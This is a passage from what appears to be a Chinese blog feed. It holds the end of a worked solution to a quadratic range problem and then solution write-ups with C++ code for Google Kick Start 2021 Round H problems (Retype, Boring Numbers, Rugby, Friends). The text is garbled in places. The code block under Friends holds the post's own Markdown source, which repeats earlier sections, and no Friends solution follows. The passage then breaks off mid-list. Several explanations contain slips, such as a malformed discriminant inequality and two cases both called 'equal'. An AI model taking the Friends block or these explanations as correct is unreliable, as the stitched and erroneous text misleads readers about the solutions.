<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>分类讨论如下：</p>
<ol>
<li>根据函数经过<code>(0,2),(1,3)</code>两个点,代入以后可以得到如下等式：<br>$$<br>c &#x3D; 2 \<br>a + b &#x3D; 1 \<br>$$<br>因此上述函数可以转换为$y &#x3D; ax^{2} + (1-a)x+2$</li>
<li>当且仅当$-1\le x \le 1$时，$|ax^{2} + (1-a)x+2| &#x3D; 2$仅只有一个解，根据题目中的条件我们知道$|ax^{2} + (1-a)x+2| &#x3D; 2$目前已经的根为$x&#x3D;0$,因此我们可以知道以下等式:<br>$$<br>|ax^{2} + (1-a)x+2| &#x3D; 2<br>$$<br>在$-1\le x \le 1$有且仅有$x&#x3D;0$这一个根，要么等式存在其他的根，且其它的根应当满足$x\le -1 , x \ge 1$;要么等式不存在其他的根。我们分情况来讨论，我们首先将上述等式的绝对值拆开，分解为：<br>$$<br>ax^{2} + (1-a)x  &#x3D; 0 \qquad (1) \<br>ax^{2} + (1-a)x + 4 &#x3D; 0 \qquad (2)<br>$$</li>
</ol>
<ul>
<li>首先判断当$a &#x3D; 0$时，上述两个方程均为一次方程，显然只有<code>(1)</code>式存在一个根为$x &#x3D; 0$</li>
<li>当$a \neq 0$ 时，上述等式<code>1</code>与等式<code>2</code>都可能存在两个根。</li>
<li><ul>
<li>等式<code>(1)</code>一定存在两个根，分别为$x_{1} &#x3D; 0,x_{2} &#x3D; \frac{a-1}{a}$，要们$x_{2} &#x3D; 0$,要么$x_{2} &gt; 1 ,x_{2} &lt; -1$.</li>
</ul>
</li>
<li><ul>
<li>等式<code>(2)</code>要么不存在实数的根，要么两个根分布如下：<br>$$<br>x_{1} &lt; -1 , x_{2} &gt; 1 \<br>x_{1} &gt; 1 , x_{2} &gt; 1 \<br>x_{1} &lt; -1 , x_{2} &lt; -1\<br>$$</li>
</ul>
</li>
</ul>
<ol start="3">
<li>我们将$a$分开来讨论：</li>
</ol>
<ul>
<li>当$a &#x3D; 0$,式<code>(1)</code>存在根为$x&#x3D;0$,式<code>(2)</code>不存在根，符合题目要求；</li>
<li>当$a &gt; 0$时：</li>
<li><ul>
<li>当$a &#x3D; 1$时，显然式<code>1</code>的两个根都为<code>0</code>，式<code>2</code>不存在根，所以符合题目要求。</li>
</ul>
</li>
<li><ul>
<li>当$a\neq 1$，首先可以判定$\frac{a-1}{a} &lt; 1$,则此时只能满足$\frac{a-1}{a} &lt; -1$,求出此时<code>a</code>的范围为$0 &lt; a &lt; \frac{1}{2}$.<br>将上述的$a$的范围.$0&lt; a &lt; \frac{1}{2}$代入到式<code>(2)</code>中发现无解，符合题目要求，即式<code>(1)</code>仅有一个解在$-1\le x \le 1$，且式<code>(2)</code>无解。此时当$a \in (0,\frac{1}{2})$符合题目要求。</li>
</ul>
</li>
<li>当$a &lt; 0$时:</li>
<li><ul>
<li>当$a &lt; 0$，首先可以判定$\frac{a-1}{a} &gt; 1$一定成立。则此时我们就需要考虑式<code>2</code>的两个根的情况，我们可以知道式<code>2</code>的根判别式为:<br>$$<br>(1-a)^{2} - 16a &gt; a<br>$$<br>则当$a &lt; 0$，此时一定存在两个实根分别为，且满足：<br>$$<br>x_{1} &#x3D; \frac{a-1+\sqrt{(a-1)^{2}-16a}}{2a} \<br>x_{2} &#x3D; \frac{a-1-\sqrt{(a-1)^{2}-16a}}{2a} \<br>x_{1} &lt; 0 &lt; x_{2} \<br>$$<br>则此时，我们需要判定以下三种情况分别成立时，<code>a</code>的取值范围：<br>$$<br>x_{1} &lt; x_{2} &lt; -1  \qquad (a)\<br>1 &lt; x_{1} &lt; x_{2}  \qquad (b)\<br>x_{1} &lt; -1 , x_{2} &gt; 1 \qquad (c)\<br>$$<br>根据简要的判别我们可以知道$(a),(b)$均不可能成立，因此只有$(c)$可能成立，我们求出不等式$c$中<code>a</code>的取值范围如下：<br>$$<br>\frac{-3}{2} &lt; a &lt; 0<br>$$</li>
</ul>
</li>
</ul>
<ol start="4">
<li>综上可知，$a$的取值范围为：<br>$$<br>a \in (\frac{-3}{2},\frac{1}{2})\cup{1}<br>$$</li>
</ol>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title>【kick start】 2021 google kickstart round H</title>
    <url>/2022/11/20/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/76/</url>
    <content><![CDATA[<h1 id="google-kickstart-round-H"><a href="#google-kickstart-round-H" class="headerlink" title="google kickstart round H"></a>google kickstart round H</h1><p><code>google kick start</code>的题目果真经典并且又不失思考的乐趣，质量非常高的题目，我觉得思考的深度非常有代表性。</p>
<h2 id="Problem-A-Retype"><a href="#Problem-A-Retype" class="headerlink" title="Problem A - Retype"></a>Problem A - Retype</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>选择游戏重启的位置</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
<li>真心是送分问题，一共只有两种选择，要么从头开始，要么倒回到第<code>s</code>关开始。<br>$$<br>minT &#x3D; k + min(n,k+n-2*s)<br>$$</li>
</ol>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; pii;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,k,s;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;k&gt;&gt;s;</span><br><span class="line">    ans = k + <span class="built_in">min</span>(n,k+n<span class="number">-2</span>*s);</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">&quot;: &quot;</span>;</span><br><span class="line">        <span class="built_in">slove</span>(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Boring-Numbers"><a href="#Boring-Numbers" class="headerlink" title="Boring Numbers"></a>Boring Numbers</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><ul>
<li><code>boring number</code>定义：从高位开始，起始索引为<code>1</code>，奇数位的数字为奇数，偶数位的数字为偶数。<br>求给定范围$[L,R]$中<code>boring number</code>的个数</li>
</ul>
<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p> 数位<code>dp</code></p>
</blockquote>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol>
<li>典型的可以用数位<code>dp</code>来解决该问题，我们可以转换思路，设<code>count(x)</code>表示从<code>1</code>到<code>x</code>之间的<code>boring number</code>的个数，则结果可以转化为:<br>$$<br>ans &#x3D; count(R) - count(L-1)<br>$$</li>
<li>难点在于求<code>count(x)</code>，我们可以将小于<code>x</code>的数字分为两种情况，一种为数字的位数与<code>x</code>相等用$X_{lower}$表示;另一种为数字的位数与<code>x</code>相等，用$X_{equal}$表示。<br>$$<br>n &#x3D; bits(x) \<br>count[x] &#x3D; X_{lower} + X_{equal} \<br>X_{lower} &#x3D; \sum_{i&#x3D;1}^{n-1}5^{i}<br>$$</li>
</ol>
<ul>
<li>求$X_{equal}$稍微复杂点，我们设<code>dp[i][0]</code>表示字符的长度为<code>i</code>,且前<code>i</code>的数字与<code>x</code>相等且为<code>boring number</code>的个数，这个其实很简单，要么为<code>0</code>,要么为<code>1</code>；设<code>dp[i][1]</code>表示字符的长度为<code>i</code>,且前<code>i</code>的数字与<code>x</code>不相等且为<code>boring number</code>的个数，则此时:<br>$$<br>dp[i][1] &#x3D; dp[i-1][1]<em>5 + dp[i-1][0]</em>(X[i]&#x2F;2) \<br>X_{equal} &#x3D; dp[n][0] + dp[n][1] \<br>count[x] &#x3D; \sum_{i&#x3D;1}^{n-1}5^{i} + dp[n][0] + dp[n][1] \<br>$$</li>
</ul>
<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; pii;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> cnt[<span class="number">20</span>];</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> dp[<span class="number">20</span>][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">count</span><span class="params">(<span class="type">long</span> <span class="type">long</span> n)</span></span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(n &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; arr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> x = n; x != <span class="number">0</span>; x = x/<span class="number">10</span>)&#123;</span><br><span class="line">        arr.<span class="built_in">push_back</span>(x%<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">reverse</span>(arr.<span class="built_in">begin</span>(),arr.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; arr.<span class="built_in">size</span>(); ++i)&#123;</span><br><span class="line">        ans += cnt[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> m = arr.<span class="built_in">size</span>();</span><br><span class="line">    <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="built_in">sizeof</span>(dp));</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; ++i)&#123;</span><br><span class="line">        <span class="comment">/*upper*/</span></span><br><span class="line">        <span class="keyword">if</span>((arr[i<span class="number">-1</span>]%<span class="number">2</span>) == (i%<span class="number">2</span>)) dp[i][<span class="number">0</span>] = dp[i<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">else</span> dp[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">/*lower*/</span></span><br><span class="line">        <span class="keyword">if</span>(i  &gt; <span class="number">1</span>) dp[i][<span class="number">1</span>] += dp[i<span class="number">-1</span>][<span class="number">1</span>]*<span class="number">5</span>;</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">1</span>)&#123;</span><br><span class="line">            dp[i][<span class="number">1</span>] += arr[i<span class="number">-1</span>]/<span class="number">2</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; arr[i<span class="number">-1</span>]; ++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>((j%<span class="number">2</span>) == (i%<span class="number">2</span>)) dp[i][<span class="number">1</span>] += dp[i<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ans += dp[m][<span class="number">0</span>];</span><br><span class="line">    ans += dp[m][<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> l,r;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    cin&gt;&gt;l&gt;&gt;r;</span><br><span class="line">    ans = <span class="built_in">count</span>(r) - <span class="built_in">count</span>(l<span class="number">-1</span>);</span><br><span class="line">    <span class="comment">//cout&lt;&lt;count(r)&lt;&lt;&quot;:&quot;&lt;&lt;count(l-1)&lt;&lt;endl;</span></span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cnt[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">18</span>; ++i)&#123;</span><br><span class="line">        cnt[i] = cnt[i<span class="number">-1</span>]*<span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">&quot;: &quot;</span>;</span><br><span class="line">        <span class="built_in">slove</span>(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="Rugby"><a href="#Rugby" class="headerlink" title="Rugby"></a>Rugby</h2><p>给定一堆坐标$(x_{i},y_{i})$,求将这些坐标变为一行的最小曼哈顿距离之和:<br>$(X,Y),(X+1,Y),(X+2,Y),(X+3,Y),(X+4,Y)…(X+N,Y)$.</p>
<h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p> 中位数。</p>
</blockquote>
<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol>
<li>我们仔细观察一下，实际上目标值的<code>(x,y)</code>实际上是独立的，相互之间不影响，则我们可以分别来求出<code>(X,Y)</code>。<br>$$<br>Target &#x3D; min(\sum_{i&#x3D;0}^{n-1}abs(x_{i}-X-i) + \sum_{i&#x3D;0}^{n-1}abs(x_{i}-Y)<br>$$</li>
<li>在已知条件下，我们很容易求出<code>y</code>的值，因为知道要满足距离之和最小的值为中位数。我们对所有坐标的纵坐标按照大小进行排序,<code>Y</code>即为排序后的中位数。<br>$$<br>Y &#x3D; \frac{y_{\frac{n-1}{2}} + y_{\frac{n}{2}}}{2}<br>$$</li>
<li>我们再来求<code>X</code>,我们同样也对<code>x</code>进行排序，我们需要求出$\sum_{i&#x3D;0}^{n-1}abs(x_{i}-X-i)$的最小值，实际上可以转为$\sum_{i&#x3D;0}^{n-1}abs((x_{i}-i) -X)$的最小值，因此我们此时构造数组：<br>$$<br>(x_{0},x_{1}-1,x_{2}-2,x_{3}-3…,x_{n}-n)<br>$$<br>此时求最小距离之和可以转换为求中位数即可，满足题目要求，此时我们相当于求上述转化数组的中位数。</li>
</ol>
<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> midx = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> midy = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">arrx</span><span class="params">(n)</span></span>;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">arry</span><span class="params">(n)</span></span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        cin&gt;&gt;arrx[i]&gt;&gt;arry[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(arry.<span class="built_in">begin</span>(),arry.<span class="built_in">end</span>());</span><br><span class="line">    <span class="built_in">sort</span>(arrx.<span class="built_in">begin</span>(),arrx.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        arrx[i] -= i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(arrx.<span class="built_in">begin</span>(),arrx.<span class="built_in">end</span>());</span><br><span class="line">    midx = (arrx[(n<span class="number">-1</span>)/<span class="number">2</span>] + arrx[n/<span class="number">2</span>])/<span class="number">2</span>;</span><br><span class="line">    midy = (arry[(n<span class="number">-1</span>)/<span class="number">2</span>] + arry[n/<span class="number">2</span>])/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        ans += <span class="built_in">abs</span>(arrx[i]-midx);</span><br><span class="line">        ans += <span class="built_in">abs</span>(arry[i]-midy);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">&quot;: &quot;</span>;</span><br><span class="line">        <span class="built_in">slove</span>(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="Friends"><a href="#Friends" class="headerlink" title="Friends"></a>Friends</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>给定图，图中的每个节点含有一个字符串，如果两个字符串<code>s,t</code>存在有相同字母，则认为两个节点存在相互连接的边，给定一组查询<code>(x,y)</code>，求节点<code>x</code>与<code>y</code>之间的最短路劲。</p>
<h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p> 图的遍历</p>
</blockquote>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>题目挺有新意的，如果直接用<code>bfs</code>来遍历图的话，按照图中给定的数据集肯定会超时，所以必须要转换思路。</li>
<li>我们可以转换成求字符<code>a,b</code>的最短距离。我们可以求所所有字符的最短转移路劲，本题也就转化为求所有可能的字符的最短转换路径。</li>
<li>我们假设源字符串为<code>s</code>，目标字符串为<code>t</code>，假如<code>s</code>和<code>t</code>之间存在相同的字符<code>e</code>，则很容易我们知道直接跳一步即可得到结果,<code>chain</code>的最短长度应该为<code>2</code>。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s-(e)-&gt;t</span><br></pre></td></tr></table></figure>
假如<code>s</code>和<code>t</code>之间是通过不同的字符进行跳转得到的结果，且目标的最短的<code>chain</code>为：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s-(c1)-&gt;s1-(c2)-&gt;s2-(c3)-&gt;s3-&gt;...-&gt;sn-(cn)-&gt;t</span><br></pre></td></tr></table></figure>
根据以上推论我们可以知道如果满足最短的<code>chain</code>，则必然可以得到以下结论:<br>$$<br>c_{1} \neq c_{2} \neq c_{3} \neq c_{4} \neq c_{5} …. \neq c_{n}<br>$$<br>我们假设存在$c_{i} &#x3D; c_{j}$,则我们可以判定直接可以通过<code>i</code>跳转到<code>j</code>即可，而不必再通过$c_{i+1},c_{i+2},…,c_{j-1}$进行跳转,因此我们只需求出不同字符之间跳转的最短距离即可。我们可以设相同字符的跳转距离为<code>0</code>.</li>
<li>我们可以很容易求出，两个字符串之间的字符跳转的最短转换距离，最终的答案为$minJump + 2$.</li>
</ol>
<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 【google kickstart】  roundH</span><br><span class="line">tags: kickstart</span><br><span class="line">categories: 算法</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"><span class="meta"># google kickstart round H</span></span><br><span class="line">`google kick start`的题目果真经典并且又不失思考的乐趣，质量非常高的题目，我觉得思考的深度非常有代表性。</span><br><span class="line"></span><br><span class="line">## Problem A - Retype</span><br><span class="line">### 题目</span><br><span class="line">选择游戏重启的位置</span><br><span class="line">### 思路</span><br><span class="line"><span class="number">1.</span> 真心是送分问题，一共只有两种选择，要么从头开始，要么倒回到第`s`关开始。</span><br><span class="line">$$</span><br><span class="line">minT = k + <span class="built_in">min</span>(n,k+n<span class="number">-2</span>*s)</span><br><span class="line">$$</span><br><span class="line">### 代码</span><br><span class="line">```c++</span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; pii;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,k,s;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;k&gt;&gt;s;</span><br><span class="line">    ans = k + <span class="built_in">min</span>(n,k+n<span class="number">-2</span>*s);</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">&quot;: &quot;</span>;</span><br><span class="line">        <span class="built_in">slove</span>(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Boring-Numbers-1"><a href="#Boring-Numbers-1" class="headerlink" title="Boring Numbers"></a>Boring Numbers</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><ul>
<li><code>boring number</code>定义：从高位开始，起始索引为<code>1</code>，奇数位的数字为奇数，偶数位的数字为偶数。<br>求给定范围$[L,R]$中<code>boring number</code>的个数</li>
</ul>
<h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p> 数位<code>dp</code></p>
</blockquote>
<h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><ol>
<li>典型的可以用数位<code>dp</code>来解决该问题，我们可以转换思路，设<code>count(x)</code>表示从<code>1</code>到<code>x</code>之间的<code>boring number</code>的个数，则结果可以转化为:<br>$$<br>ans &#x3D; count(R) - count(L-1)<br>$$</li>
<li>难点在于求<code>count(x)</code>，我们可以将小于<code>x</code>的数字分为两种情况，一种为数字的位数与<code>x</code>相等用$X_{lower}$表示;另一种为数字的位数与<code>x</code>相等，用$X_{equal}$表示。<br>$$<br>n &#x3D; bits(x) \<br>count[x] &#x3D; X_{lower} + X_{equal} \<br>X_{lower} &#x3D; \sum_{i&#x3D;1}^{n-1}5^{i}<br>$$</li>
</ol>
<ul>
